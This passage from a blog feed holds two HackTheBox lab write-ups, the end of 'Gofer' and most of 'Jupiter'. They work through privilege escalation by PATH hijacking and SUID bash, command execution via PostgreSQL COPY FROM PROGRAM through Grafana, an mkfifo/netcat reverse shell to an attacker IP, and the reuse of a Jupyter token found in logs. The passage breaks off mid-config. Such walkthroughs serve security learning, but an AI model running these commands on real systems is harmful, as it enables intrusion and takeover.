effectively sets the role as \u0026ldquo;admin\u0026rdquo; by exploiting the dangling pointer. With the \u0026ldquo;admin\u0026rdquo; role, execute the backup routine, which runs the system(\u0026quot;tar -czvf /root/backups/backup_notes.tar.gz /opt/notes\u0026quot;); command. Exploit PATH hijacking since tar doesn\u0026rsquo;t have an absolute path set, allowing me to run my own malicious binary. Path Hijacking\nI created a file named \u0026ldquo;tar\u0026rdquo; with malicious code in the /dev/shm directory, made it executable, and added /dev/shm to the PATH. By doing this, I can successfully exploit the PATH hijacking vulnerability. As a result, when the archive function will, my malicious \u0026ldquo;tar\u0026rdquo; file in /dev/shm runs first, executing my malicious code.\n(remote) tbuckley@gofer.htb:/dev/shm$ cat tar #!/bin/bash chmod +s /bin/bash (remote) tbuckley@gofer.htb:/dev/shm$ chmod +x tar (remote) tbuckley@gofer.htb:/dev/shm$ export PATH=/dev/shm:$PATH (remote) tbuckley@gofer.htb:/dev/shm$ echo $PATH /dev/shm:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/sbin:/usr/sbin:/usr/local/sbin The notes content can be created easily using python\n(remote) tbuckley@gofer.htb:/dev/shm$ python3 -c \u0026#34;print(\u0026#39;0\u0026#39;*24+\u0026#39;admin\u0026#39;)\u0026#34; 000000000000000000000000admin Once all the necessary conditions are in place, I can trick the backup function into executing my malicious file.\n(remote) tbuckley@gofer.htb:/dev/shm$ /usr/local/bin/notes ======================================== 1) Create an user and choose an username 2) Show user information 3) Delete an user 4) Write a note 5) Show a note 6) Save a note (not yet implemented) 7) Delete a note 8) Backup notes 9) Quit ======================================== Your choice: 1 Choose an username: randomUser ...snip... ======================================== 3) Delete an user ...snip... Your choice: 3 ...snip... ======================================== 4) Write a note ...snip... Your choice: 4 Write your note: 000000000000000000000000admin ...snip... ======================================== 2) Show user information ...snip... Your choice: 2 Username: 000000000000000000000000admin Role: admin ...snip... ======================================== 8) Backup notes ...snip... Your choice: 8 Access granted! Now that I have executed the backup function, the malicious code was executed and /bin/bash has a SUID bit set.\n(remote) tbuckley@gofer.htb:/dev/shm$ ls -la /bin/bash -rwsr-sr-x 1 root root 1234376 Mar 27 2022 /bin/bash Since /bin/bash is owned by root and has the SUID bit set, I can execute bash in in privileged mode granting effective root privileges.\n(remote) tbuckley@gofer.htb:/dev/shm$ bash -p (remote) root@gofer.htb:/dev/shm# id uid=1002(tbuckley) gid=1002(tbuckley) euid=0(root) egid=0(root) groups=0(root),1002(tbuckley),1004(dev) Pwned!!\nBeyond Root #I was curious how the phishing attempt was stimulated in this HackTheBox environment since there are no real users. The mail.sh script in the root directory helps shed a light on this.\nAll URLs in the email sent to the user, jhudson are collected in the URLS variable For each URL the linked files are downloaded to jhudson\u0026rsquo;s download directory. Next the ownership is changed to jhudson and file permissions to \u0026ldquo;755\u0026rdquo;, making them executable by jhudson. LibreOffice is executed in headless mode to open the downloaded files in view-only mode. This represents a scenario where a malicious macro could potentially be triggered. There\u0026rsquo;s also a wait period of 3 seconds, which I am assuming is to mimic user interaction. (remote) root@gofer.htb:/root/scripts# cat mail.sh #!/bin/bash USER=\u0026#34;jhudson\u0026#34; URLS=$(/usr/bin/grep -Eo \u0026#39;http://[^ \u0026gt;]+\u0026#39; /var/mail/$USER) /usr/bin/mkdir /home/$USER/Downloads for u in $URLS do echo $u; NAME=$(basename $u|cut -d \u0026#39;.\u0026#39; -f 1) EXT=$(basename $u|cut -d \u0026#39;.\u0026#39; -f 2) RANDOMNB=$(date +%s%N) FILENAME=\u0026#34;$NAME$RANDOMNB.$EXT\u0026#34; timeout 10 wget -O \u0026#34;/home/$USER/Downloads/$FILENAME\u0026#34; $u /usr/bin/chown $USER:$USER /home/$USER/Downloads/$FILENAME /usr/bin/chmod 755 \u0026#34;/home/$USER/Downloads/$FILENAME\u0026#34; sleep 3 /bin/su -c \u0026#34;cd /usr/bin; ./libreoffice -env:SingleAppInstance=false --norestore --view --headless --nologo --nolockcheck --eventtesting /home/$USER/Downloads/$FILENAME \u0026amp;\u0026#34; $USER sleep 3 /usr/bin/killall oosplash done echo \u0026#34;\u0026#34; \u0026gt; /var/mail/$USER rm -rf /home/$USER/Downloads/* Related Links # SSRF (Server Side Request Forgery) - HackTricks tarunkant/Gopherus: This tool generates gopher link for exploiting SSRF and gaining RCE in various servers Blog on Gopherus Tool Using Malicious LibreOffice Calc Macros to Target Linux Shell Function - LibreOffice Docs How to use shell from basic macro (solved) - English - Ask LibreOffice Dangling Pointer - SMASHING THE POINTER FOR FUN AND PROFIT Use-After-Use-After-Free: Exploit UAF by Generating Your Own whitepaper ","date":"29 October 2023","permalink":"/blog/htb-gofer/","section":"Blog Posts","summary":"Gofer is a hard linux box, I discovered a HTTP proxy vulnerable to Server-Side Request Forgery. Utilizing this SSRF vulnerability, I sent a phishing email through the internal SMTP server via the gopher protocol, embedding a malicious macro that activates upon document opening. Next, I obtained user credentials from a background process linked to the proxy. Finally, I found a vulnerability in the \u0026rsquo;notes\u0026rsquo; binary, exploiting a use-after-free vulnerability associated with a dangling pointer.","title":"Htb Gofer"},{"content":"","date":null,"permalink":"/tags/libreoffice/","section":"Tags","summary":"","title":"LibreOffice"},{"content":"","date":null,"permalink":"/tags/macros/","section":"Tags","summary":"","title":"Macros"},{"content":"","date":null,"permalink":"/tags/path-hijack/","section":"Tags","summary":"","title":"Path-Hijack"},{"content":"","date":null,"permalink":"/tags/phishing/","section":"Tags","summary":"","title":"Phishing"},{"content":"","date":null,"permalink":"/tags/pspy/","section":"Tags","summary":"","title":"Pspy"},{"content":"","date":null,"permalink":"/tags/smtp/","section":"Tags","summary":"","title":"Smtp"},{"content":"","date":null,"permalink":"/tags/use-after-free/","section":"Tags","summary":"","title":"Use-After-Free"},{"content":"","date":null,"permalink":"/tags/arftracksat/","section":"Tags","summary":"","title":"Arftracksat"},{"content":"","date":null,"permalink":"/tags/command-execution/","section":"Tags","summary":"","title":"Command-Execution"},{"content":"","date":null,"permalink":"/tags/grafana/","section":"Tags","summary":"","title":"Grafana"},{"content":"Jupiter HTB #Overview # Jupiter is a medium HTB box where I began by exploiting a supposed feature in Grafana to execute commands and gain an initial foothold. After establishing a foothold, I took advantage of configuration issues within a script executed by the Shadow Simulator via a cron job. Then, I discovered Jupyter server tokens in log files and leveraged them to execute commands within a Jupyter notebook. Finally, I exploited a customized version of arftracksat, a satellite tracking system, with the ability to run as the root user, elevating my privileges on the system.\nEnumeration # Open Ports #I discovered two open ports through a Nmap scan\nport 22 → OpenSSH port 80 Nginx web server nmap -p22,80 -sV -sC -T4 -Pn -oA 10.129.229.15 10.129.229.15 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-22 10:08 EDT Nmap scan report for jupiter.htb (10.129.229.15) Host is up (0.062s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 ac5bbe792dc97a00ed9ae62b2d0e9b32 (ECDSA) |_ 256 6001d7db927b13f0ba20c6c900a71b41 (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-title: Home | Jupiter |_http-server-header: nginx/1.18.0 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel port 80 - HTTP #From the HTTP headers, it appears that the IP address redirects to the jupiter.htb domain. Unfortunately, no additional information was found in the headers.\n\u0026gt; http -ph 10.129.229.15 HTTP/1.1 301 Moved Permanently Connection: keep-alive Content-Length: 178 Content-Type: text/html Date: Thu, 22 Jun 2023 14:12:15 GMT Location: http://jupiter.htb/ Server: nginx/1.18.0 (Ubuntu) \u0026gt; http -ph jupiter.htb HTTP/1.1 200 OK Connection: keep-alive Content-Encoding: gzip Content-Type: text/html Date: Thu, 22 Jun 2023 14:06:33 GMT ETag: W/\u0026#34;63ff05bd-4ce0\u0026#34; Last-Modified: Wed, 01 Mar 2023 07:58:53 GMT Server: nginx/1.18.0 (Ubuntu) Transfer-Encoding: chunked The index page appears to be focused on data analytics related to space-related content.\nIndex page Given the lack of any substantial information on the website and having a valid domain, I decided to fuzz virtual hosts, and discovered another virtual host named kisok.\n\u0026gt; wfuzz_subdomain_enum jupiter.htb --hh 178 ******************************************************** * Wfuzz 3.1.0 - The Web Fuzzer * ******************************************************** Target: http://jupiter.htb/ Total requests: 4989 ===================================================================== ID Response Lines Word Chars Payload ===================================================================== 000001955: 200 211 L 798 W 34390 Ch \u0026#34;kiosk\u0026#34; Total time: 0 Processed Requests: 4989 Filtered Requests: 4988 Requests/sec.: 0 kiosk.jupiter.htb #It seems the kiosk vhost is a Grafana instance, which serves as a visualization tool for presenting data related to moons. Grafana is known for creating visually appealing graphs and charts based on metrics collected from external sources.\nKiosk vhost Initial Foothold # The data source that Grafana is utilizing for its metrics can be listed through the /api/datasources endpoint. In this case, it\u0026rsquo;s a PostgreSQL database named moon_namesdb .\n\u0026gt; http -pb http://kiosk.jupiter.htb/api/datasources [ { \u0026#34;access\u0026#34;: \u0026#34;proxy\u0026#34;, \u0026#34;basicAuth\u0026#34;: false, \u0026#34;database\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;id\u0026#34;: 1, \u0026#34;isDefault\u0026#34;: true, \u0026#34;jsonData\u0026#34;: { \u0026#34;database\u0026#34;: \u0026#34;moon_namesdb\u0026#34;, \u0026#34;sslmode\u0026#34;: \u0026#34;disable\u0026#34; }, \u0026#34;name\u0026#34;: \u0026#34;PostgreSQL\u0026#34;, \u0026#34;orgId\u0026#34;: 1, \u0026#34;readOnly\u0026#34;: false, \u0026#34;type\u0026#34;: \u0026#34;postgres\u0026#34;, \u0026#34;typeLogoUrl\u0026#34;: \u0026#34;public/app/plugins/datasource/postgres/img/postgresql_logo.svg\u0026#34;, \u0026#34;typeName\u0026#34;: \u0026#34;PostgreSQL\u0026#34;, \u0026#34;uid\u0026#34;: \u0026#34;YItSLg-Vz\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;localhost:5432\u0026#34;, \u0026#34;user\u0026#34;: \u0026#34;grafana_viewer\u0026#34; } ] File Read via PostgreSQL #Going back to burp history, found numerous POST requests to the /api/ds/query endpoint, where raw SQL queries are being executed through the rawSql parameter.\nRaw SQL query execution By modifying the rawSQL parameter in the request, I was able to retrieve the query\u0026rsquo;s result as the response.\nRaw SQL query I wrote a Python script to streamline the execution of SQL queries via CLI, simplifying the process.\n#!/usr/bin/env python import re import requests import sys import json import urllib3 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) query = sys.argv[1] username = \u0026#34;\u0026#34; password = \u0026#34;\u0026#34; url = \u0026#34;http://kiosk.jupiter.htb/api/ds/query\u0026#34; proxies = {\u0026#34;http\u0026#34;: \u0026#34;http://127.0.0.1:8080\u0026#34;} payload = { \u0026#34;queries\u0026#34;: [ { \u0026#34;refId\u0026#34;: \u0026#34;A\u0026#34;, \u0026#34;datasource\u0026#34;: {\u0026#34;type\u0026#34;: \u0026#34;postgres\u0026#34;, \u0026#34;uid\u0026#34;: \u0026#34;YItSLg-Vz\u0026#34;}, \u0026#34;rawSql\u0026#34;: f\u0026#34;{query}\u0026#34;, \u0026#34;format\u0026#34;: \u0026#34;table\u0026#34;, \u0026#34;datasourceId\u0026#34;: 1, \u0026#34;intervalMs\u0026#34;: 60000, \u0026#34;maxDataPoints\u0026#34;: 939, } ], \u0026#34;range\u0026#34;: { \u0026#34;from\u0026#34;: \u0026#34;2023-06-22T08:22:31.310Z\u0026#34;, \u0026#34;to\u0026#34;: \u0026#34;2023-06-22T14:22:31.310Z\u0026#34;, \u0026#34;raw\u0026#34;: {\u0026#34;from\u0026#34;: \u0026#34;now-6h\u0026#34;, \u0026#34;to\u0026#34;: \u0026#34;now\u0026#34;}, }, \u0026#34;from\u0026#34;: \u0026#34;1687422151310\u0026#34;, \u0026#34;to\u0026#34;: \u0026#34;1687443751310\u0026#34;, } try: session = requests.Session() response = session.post(url=url, json=payload, proxies=proxies, verify=False) # print(response.text) response_json = response.json() executed_query = response_json[\u0026#34;results\u0026#34;][\u0026#34;A\u0026#34;][\u0026#34;frames\u0026#34;][0][\u0026#34;schema\u0026#34;][\u0026#34;meta\u0026#34;][ \u0026#34;executedQueryString\u0026#34; ] data = response_json[\u0026#34;results\u0026#34;][\u0026#34;A\u0026#34;][\u0026#34;frames\u0026#34;][0][\u0026#34;data\u0026#34;] print(f\u0026#34;Executed Query: {executed_query}\u0026#34;) # print(f\u0026#34;{data}\u0026#34;) print(json.dumps(data, indent=4)) except Exception as e: print(f\u0026#34;Exception raised: {e}\u0026#34;) With the Python script, I successfully managed to extract information from the information_schema tables.\n\u0026gt; python raw_sql_exec.py \u0026#34;select table_name from information_schema.tables;\u0026#34; Executed Query: select table_name from information_schema.tables; { \u0026#34;values\u0026#34;: [ [ \u0026#34;moons\u0026#34;, \u0026#34;pg_statistic\u0026#34;, \u0026#34;pg_type\u0026#34;, \u0026#34;pg_foreign_table\u0026#34;, \u0026#34;pg_authid\u0026#34;, \u0026#34;pg_shadow\u0026#34;, ... ... ... With the capability to execute SQL queries, I can access file contents by following this approach:\nCreate a new table with a schema set to TEXT. Copy the contents of a file into this table. Finally, I can dump the table, thereby allowing me to read the contents of files, such as /etc/hostname. The first two won\u0026rsquo;t return any data, so the script simply returns an Exception.\n❯ python raw_sql_exec.py \u0026#34;create table file_read(file TEXT);\u0026#34; Exception raised: list index out of range ❯ python raw_sql_exec.py \u0026#34;COPY file_read FROM \u0026#39;/etc/hostname\u0026#39;;\u0026#34; Exception raised: list index out of range ❯ python raw_sql_exec.py \u0026#34;select * from file_read;\u0026#34; Executed Query: select * from file_read; { \u0026#34;values\u0026#34;: [ [ \u0026#34;jupiter\u0026#34; ] ] } By dumping /etc/passwd, identified three users with login shells → postgres, juno and jovian\n❯ python raw_sql_exec.py \u0026#34;COPY file_read FROM \u0026#39;/etc/passwd\u0026#39;;\u0026#34; Exception raised: list index out of range ❯ python raw_sql_exec.py \u0026#34;select * from file_read;\u0026#34; Executed Query: select * from file_read; { \u0026#34;values\u0026#34;: [ [ \u0026#34;jupiter\u0026#34;, \u0026#34;root❌0:0:root:/root:/bin/bash\u0026#34;, ...snip... \u0026#34;www-data❌33:33:www-data:/var/www:/usr/sbin/nologin\u0026#34;, ...snip... \u0026#34;postgres❌114:120:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash\u0026#34;, \u0026#34;grafana❌115:121::/usr/share/grafana:/bin/false\u0026#34;, \u0026#34;jovian❌1001:1002:,,,:/home/jovian:/bin/bash\u0026#34;, \u0026#34;_laurel❌998:998::/var/log/laurel:/bin/false\u0026#34; ] ] } Command Execution through PostgreSQL #Since I couldn\u0026rsquo;t find any useful information in the database, I decided to explore the CVE-2019–9193 vulnerability, which enables command execution through PostgreSQL, particularly since I have the capability to execute raw SQL queries.\n\u0026gt; python raw_sql_exec.py \u0026#34;DROP TABLE IF EXISTS cmd_exec;\u0026#34; Exception raised: list index out of range \u0026gt; python raw_sql_exec.py \u0026#34;CREATE TABLE cmd_exec(cmd_output text);\u0026#34; Exception raised: list index out of range \u0026gt; python raw_sql_exec.py \u0026#34;COPY cmd_exec FROM PROGRAM \u0026#39;id\u0026#39;;\u0026#34; Exception raised: list index out of range \u0026gt; python raw_sql_exec.py \u0026#34;SELECT * FROM cmd_exec;\u0026#34; Executed Query: SELECT * FROM cmd_exec; { \u0026#34;values\u0026#34;: [ [ \u0026#34;uid=114(postgres) gid=120(postgres) groups=120(postgres),119(ssl-cert)\u0026#34; ] ] } Shell as postgres #Got a shell as the user postgres using the mkfifo reverse shell payload.\n❯ python raw_sql_exec.py \u0026#34;COPY cmd_exec FROM PROGRAM \u0026#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2\u0026gt;\u0026amp;1|nc 10.10.14.16 9005 \u0026gt;/tmp/f\u0026#39;;\u0026#34; Exception raised: Expecting value: line 1 column 1 (char 0) The connection resets after a few minutes due to a timeout in the rawSQL request. Since the user postgres has a login shell, I injected SSH keys to establish a persistent session.\n(local) pwncat$ connect -lp 9005 [11:37:46] received connection from 10.129.229.15:35694 bind.py:84 [11:37:48] 0.0.0.0:9005: upgrading from /usr/bin/dash to /usr/bin/bash manager.py:957 [11:37:49] 10.129.229.15:35694: loaded known host from db manager.py:957 (local) pwncat$ (remote) postgres@jupiter:/var/lib/postgresql/14/main$ id uid=114(postgres) gid=120(postgres) groups=120(postgres),119(ssl-cert) Shell as Juno # Now that I have a shell as postgres, my next step is to escalate my privileges to become either juno or jovian.\n(remote) postgres@jupiter:/$ cat /etc/passwd | grep sh$ root❌0:0:root:/root:/bin/bash juno❌1000:1000:juno:/home/juno:/bin/bash postgres❌114:120:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash jovian❌1001:1002:,,,:/home/jovian:/bin/bash (remote) postgres@jupiter:/$ ls -la /home total 16 drwxr-xr-x 4 root root 4096 Mar 7 13:00 . drwxr-xr-x 19 root root 4096 May 4 18:59 .. drwxr-x--- 6 jovian jovian 4096 May 4 18:59 jovian drwxr-x--- 8 juno juno 4096 May 4 12:10 juno While using pspy, I came across a few commands located in the /dev/shm/ directory, particularly the network-simulation.yml file. These commands appear to be cron jobs, and they run under the user \u0026ldquo;jovian.\u0026rdquo; The network-simulation.yml file is executed using the shadow network simulator.\n2023/06/22 15:54:01 CMD: UID=1000 PID=20608 | /bin/bash /home/juno/shadow-simulation.sh 2023/06/22 15:54:01 CMD: UID=1000 PID=20609 | /bin/sh -c /home/juno/shadow-simulation.sh 2023/06/22 15:54:01 CMD: UID=1000 PID=20612 | /home/juno/.local/bin/shadow /dev/shm/network-simulation.yml 2023/06/22 15:54:01 CMD: UID=1000 PID=20615 | sh -c lscpu --online --parse=CPU,CORE,SOCKET,NODE 2023/06/22 15:54:01 CMD: UID=1000 PID=20616 | lscpu --online --parse=CPU,CORE,SOCKET,NODE 2023/06/22 15:54:01 CMD: UID=1000 PID=20621 | /usr/bin/python3 -m http.server 80 2023/06/22 15:54:01 CMD: UID=1000 PID=20622 | /usr/bin/curl -s server 2023/06/22 15:54:01 CMD: UID=1000 PID=20624 | /usr/bin/curl -s server 2023/06/22 15:54:01 CMD: UID=1000 PID=20626 | 2023/06/22 15:54:01 CMD: UID=1000 PID=20629 | rm -rf /dev/shm/shadow.data 2023/06/22 15:54:01 CMD: UID=1000 PID=20631 | cp -a /home/juno/shadow/examples/http-server/network-simulation.yml /dev/shm/ (remote) postgres@jupiter:/dev/shm$ ls -la total 32 drwxrwxrwt 3 root root 120 Jun 22 16:02 . drwxr-xr-x 20 root root 4020 Jun 22 13:50 .. prw------- 1 postgres postgres 0 Jun 22 15:44 f -rw-rw-rw- 1 juno juno 815 Mar 7 12:28 network-simulation.yml -rw------- 1 postgres postgres 26976 Jun 22 13:50 PostgreSQL.1576774596 drwxrwxr-x 3 juno juno 100 Jun 22 16:02 shadow.data Shadow is a discrete-event network simulator that directly executes real application code, enabling you to simulate distributed systems with thousands of network-connected processes in realistic and scalable private network experiments using your laptop, desktop, or server running Linux.\nThe network-simulation.yml file appears to implement a client-server model, and the commands specified in the processes YAML parameter are being executed as native Linux processes through the system call API.\ngeneral: # stop after 10 simulated seconds stop_time: 10s # old versions of cURL use a busy loop, so to avoid spinning in this busy # loop indefinitely, we add a system call latency to advance the simulated # time when running non-blocking system calls model_unblocked_syscall_latency: true network: graph: # use a built-in network graph containing # a single vertex with a bandwidth of 1 Gbit type: 1_gbit_switch hosts: # a host with the hostname \u0026#39;server\u0026#39; server: network_node_id: 0 processes: - path: /usr/bin/python3 args: -m http.server 80 start_time: 3s # three hosts with hostnames \u0026#39;client1\u0026#39;, \u0026#39;client2\u0026#39;, and \u0026#39;client3\u0026#39; client: network_node_id: 0 quantity: 3 processes: - path: /usr/bin/curl args: -s server start_time: 5s These processes are observable and can be confirmed using pspy, with the execution of a command occurring the specified number of times, such as three times in the case of the curl command.\n2023/06/22 17:04:01 CMD: UID=1000 PID=22118 | /usr/bin/python3 -m http.server 80 2023/06/22 17:04:01 CMD: UID=1000 PID=22119 | /usr/bin/curl -s server 2023/06/22 17:04:01 CMD: UID=1000 PID=22121 | /usr/bin/curl -s server 2023/06/22 17:04:01 CMD: UID=1000 PID=22123 | /usr/bin/curl -s server By modifying the path and args parameters for the processes parameter, it\u0026rsquo;s possible to obtain a privileged bash session as juno. To achieve this, I created a copy of /bin/bash in the /tmp directory, ensuring that it is owned by the juno user and setting the SUID bit on it.\nhosts: # a host with the hostname \u0026#39;server\u0026#39; server: network_node_id: 0 processes: - path: /usr/bin/cp args: /bin/bash /tmp/bash start_time: 3s # three hosts with hostnames \u0026#39;client1\u0026#39;, \u0026#39;client2\u0026#39;, and \u0026#39;client3\u0026#39; client: network_node_id: 0 processes: - path: /usr/bin/chmod args: a+s /tmp/bash start_time: 5s This will allowed me to execute /tmp/bash privileged mode with elevated privileges as juno.\n(remote) postgres@jupiter:/dev/shm$ ls -l /tmp/bash -rwsr-sr-x 1 juno juno 1396520 Jun 22 18:06 /tmp/bash (remote) postgres@jupiter:/dev/shm$ /tmp/bash -p (remote) juno@jupiter:/dev/shm$ id uid=114(postgres) gid=120(postgres) euid=1000(juno) egid=1000(juno) groups=1000(juno),119(ssl-cert),120(postgres) Shell as Jovian # To establish a stable and persistent session via SSH, I injected my SSH key into juno\u0026rsquo;s SSH directory. This enables me to maintain secure and continuous access to the system as juno.\n(remote) juno@jupiter:/home/juno$ id uid=1000(juno) gid=1000(juno) groups=1000(juno),1001(science) Command execution via jupyter notebook #Discovering that juno belongs to the science group is intriguing. While searching for files and directories linked to this group, I uncovered some interesting items, including a flares.ipynb notebook and a couple Jupyter logs.\n(remote) juno@jupiter:/home/juno$ find / -group science 2\u0026gt;/dev/null /opt/solar-flares /opt/solar-flares/flares.csv /opt/solar-flares/xflares.csv /opt/solar-flares/map.jpg /opt/solar-flares/start.sh /opt/solar-flares/logs /opt/solar-flares/logs/jupyter-2023-03-10-25.log /opt/solar-flares/logs/jupyter-2023-03-08-37.log /opt/solar-flares/logs/jupyter-2023-03-08-38.log /opt/solar-flares/logs/jupyter-2023-03-08-36.log /opt/solar-flares/logs/jupyter-2023-03-09-11.log /opt/solar-flares/logs/jupyter-2023-03-09-24.log /opt/solar-flares/logs/jupyter-2023-03-08-14.log /opt/solar-flares/logs/jupyter-2023-03-09-59.log /opt/solar-flares/flares.html /opt/solar-flares/cflares.csv /opt/solar-flares/flares.ipynb /opt/solar-flares/.ipynb_checkpoints /opt/solar-flares/mflares.csv The presence of Jupyter logs suggests that a notebook server is indeed running. By examining the open ports on the server, I discovered port 3000 (default for Grafana), port 5432 for PostgreSQL, which leaves port 8888 for Jupyter. Unfortunately, I encountered issues, as I couldn\u0026rsquo;t even run basic CLI commands like jupyter notebook list due to a missing module. The python notebook isn\u0026rsquo;t of much use either unless I can access through jupyter.\n(remote) juno@jupiter:/home/juno$ ss -antlp State Recv-Q Send-Q Local Address:Port Peer Address:Port Process LISTEN 0 511 0.0.0.0:80 0.0.0.0:* LISTEN 0 4096 127.0.0.53%lo:53 0.0.0.0:* LISTEN 0 128 0.0.0.0:22 0.0.0.0:* LISTEN 0 4096 127.0.0.1:3000 0.0.0.0:* LISTEN 0 128 127.0.0.1:8888 0.0.0.0:* LISTEN 0 244 127.0.0.1:5432 0.0.0.0:* LISTEN 0 128 [::]:22 [::]:* I set up port forwarding for port 8888, allowing me to access the Jupyter notebook server locally on my attack box. This was possible through the SSH connection I had already established.\n\u0026gt; ssh -i id_rsa.juno juno@jupiter.htb -L 8888:127.0.0.1:8888 -N I\u0026rsquo;m able to access the Jupyter Server login page at localhost:8888. It appears to require either a password or a token for access.\nJupyter server login page To access the Jupyter server, having the token is essential, which I currently lack. However, I do have access to the Jupyter logs, and since I need the token, these logs can potentially provide relevant information.\n(remote) juno@jupiter:/home/juno$ ls -lt /opt/solar-flares/logs/ total 116 -rw-rw-r-- 1 jovian jovian 1536 Jun 22 18:55 jupyter-2023-06-22-50.log ...snip... I found the token in the logs, and the token from the most recent log entry successfully grants access to the notebook server page.\n(remote) juno@jupiter:/home/juno$ cat /opt/solar-flares/logs/jupyter-2023-06-22-50.log [W 13:50:26.518 NotebookApp] Terminals not available (error was No module named \u0026#39;terminado\u0026#39;) [I 13:50:26.526 NotebookApp] Serving notebooks from local directory: /opt/solar-flares [I 13:50:26.527 NotebookApp] Jupyter Notebook 6.5.3 is running at: [I 13:50:26.527 NotebookApp] http://localhost:8888/?token=0aa258d2dae42795dd2c82a73a6879a2c2a93bfb2316977a [I 13:50:26.527 NotebookApp] or http://127.0.0.1:8888/?token=0aa258d2dae42795dd2c82a73a6879a2c2a93bfb2316977a [I 13:50:26.527 NotebookApp] Use Control-C to stop this server and shut down all kernels (twice to skip confirmation). [W 13:50:26.532 NotebookApp] No web browser found: could not locate runnable browser. [C 13:50:26.532 NotebookApp] To access the notebook, open this file in a browser: file:///home/jovian/.local/share/jupyter/runtime/nbserver-1114-open.html Or copy and paste one of these URLs: http://localhost:8888/?token=0aa258d2dae42795dd2c82a73a6879a2c2a93bfb2316977a or http://127.0.0.1:8888/?token=0aa258d2dae42795dd2c82a73a6879a2c2a93bfb2316977a [I 18:44:33.481 NotebookApp] 302 GET / (127.0.0.1) 0.980000ms [I 18:44:33.617 NotebookApp] 302 GET /tree? (127.0.0.1) 1.520000ms [W 18:54:02.909 NotebookApp] 401 POST /login?next=%2Ftree%3F (127.0.0.1) 2.830000ms referer=http://127.0.0.1:8888/login?next=%2Ftree%3F Following the use of the token, I can now access the Python notebook that I found earlier on the Jupyter server.\nJupyter Serevr Given that the Python notebook is owned by jovian, I have the capability to execute system commands within the notebook using the os module, effectively executing commands as jovian.\nJupyter command execution With os.system(), I can either establish a reverse shell for remote access or inject my SSH keys into the system.\nJupyter reverse shell ❯ pc -lp 9004 [15:11:59] Welcome to pwncat 🐈! __main__.py:164 [15:12:02] received connection from 10.129.229.15:40834 bind.py:84 [15:12:04] 10.129.229.15:40834: registered new host w/ db manager.py:957 (local) pwncat$ (remote) jovian@jupiter:/home/jovian$ id uid=1001(jovian) gid=1002(jovian) groups=1002(jovian),27(sudo),1001(science) (remote) jovian@jupiter:/home/jovian$ Escalating to root #Sattrack Command execution and file read #It appears that Jovian has sudo privileges to execute the sattrack binary as the root user without requiring a password. This can potentially be leveraged for further exploitation.\n(remote) jovian@jupiter:/home/jovian$ sudo -l Matching Defaults entries for jovian on jupiter: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty User jovian may run the following commands on jupiter: (ALL) NOPASSWD: /usr/local/bin/sattrack Based on the help message, it seems that \u0026ldquo;sattrack\u0026rdquo; is a command-line utility for a Satellite Tracking System and it requires a configuration file for its operation.\n(remote) jovian@jupiter:/home/jovian$ ls -l /usr/local/bin/sattrack -rwxr-xr-x 1 root root 1113632 Mar 8 12:07 /usr/local/bin/sattrack (remote) jovian@jupiter:/home/jovian$ /usr/local/bin/sattrack --help Satellite Tracking System Configuration file has not been found. Please try again! After executing strings on the binary and subsequently grepping it for configuration information, I discovered the following key details:\nThe configuration file is likely located at /tmp/config.json. The binary needs several parameters in its config, including: tleroot updatePerdiod station name lat lon hgt mapfile texturefile tlefile (remote) jovian@jupiter:/home/jovian$ strings /usr/local/bin/sattrack | wc -l 5016 (remote) jovian@jupiter:/home/jovian$ strings /usr/local/bin/sattrack | grep -i config /tmp/config.json Configuration file has not been found. Please try again! tleroot not defined in config updatePerdiod not defined in config station not defined in config name not defined in config lat not defined in config lon not defined in config hgt not defined in config mapfile not defined in config texturefile not defined in config tlefile not defined in config su_lib_log_config _GLOBAL__sub_I__Z6configB5cxx11 _Z14validateConfigv I attempted to generate a configuration file at /tmp/config.json using the above info, but I encountered an error indicating that the JSON config was malformed. Which means either the structure or the content of the config file is invalid.\n{ \u0026#34;tleroot\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;updatePerdiod\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;station\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;lat\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;lon\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;hgt\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;mapfile\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;texturefile\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;tlefile\u0026#34;: \u0026#34;\u0026#34;, } While searching for a config.json file on the system, I came across one located at /usr/local/share/sattrack/config.json. This particular configuration file contains a considerably larger number of parameters compared to the one I initially attempted to create.\n(remote) jovian@jupiter:/tmp$ find / -name config.json 2\u0026gt;/dev/null /usr/local/share/sattrack/config.json /usr/local/lib/python3.10/dist-packages/zmq/utils/config.json (remote) jovian@jupiter:/tmp$ cat /usr/local/share/sattrack/config.json { \u0026#34;tleroot\u0026#34;: \u0026#34;/tmp/tle/\u0026#34;, \u0026#34;tlefile\u0026#34;: \u0026#34;weather.txt\u0026#34;, \u0026#34;mapfile\u0026#34;: \u0026#34;/usr/local/share/sattrack/map.json\u0026#34;, \u0026#34;texturefile\u0026#34;: \u0026#34;/usr/local/share/sattrack/earth.png\u0026#34;, \u0026#34;tlesources\u0026#34;: [ \u0026#34;http://celestrak.org/NORAD/elements/weather.txt\u0026#34;, \u0026#34;http://celestrak.org/NORAD/elements/noaa.txt\u0026#34;, \u0026#34;http://celestrak.org/NORAD/elements/gp.php?GROUP=starlink\u0026amp;FORMAT=tle\u0026#34; ], \u0026#34;updatePerdiod\u0026#34;: 1000, \u0026#34;station\u0026#34;: { \u0026#34;name\u0026#34;: 